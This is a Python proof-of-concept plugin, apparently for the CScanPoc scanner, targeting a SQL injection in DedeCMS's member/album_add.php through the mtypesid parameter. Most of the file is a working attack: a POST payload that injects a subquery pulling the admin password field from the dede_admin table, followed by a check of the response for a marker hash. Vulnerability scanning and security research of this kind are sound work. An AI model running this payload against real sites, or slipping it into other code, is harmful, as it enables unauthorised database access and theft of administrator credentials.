# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'DedeCMS_0034_L'  # 平台漏洞编号，留空
    name = 'DedeCMS album_add.php sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-10-09'  # 漏洞公布时间
    desc = '''
        DedeCMS /dedecms/member/album_add.php文件中，对输入参数mtypesid未进行int整型转义，导致SQL注入的发生。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/792/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'be2920b8-a567-48f9-a887-773d91dd570f'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 漏洞需要会员登录
            s = requests.session()
            payload = '/dedecmsnew/member/album_add.php'
            data = """mtypesid=1'),("'",'0','1367930810','p','0','2','-1','0','0',(SELECT concat(md5(c),0x5f,pwd,0x5f) FROM dede_admin where userid='admin'),'','','12333','','','1367930810','1367930810','4','image','test','3')#@`'`'"""
            url = self.target + payload
            s.get(url)
            r = s.post(url, data=data)

            if r.status_code == 200 and '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
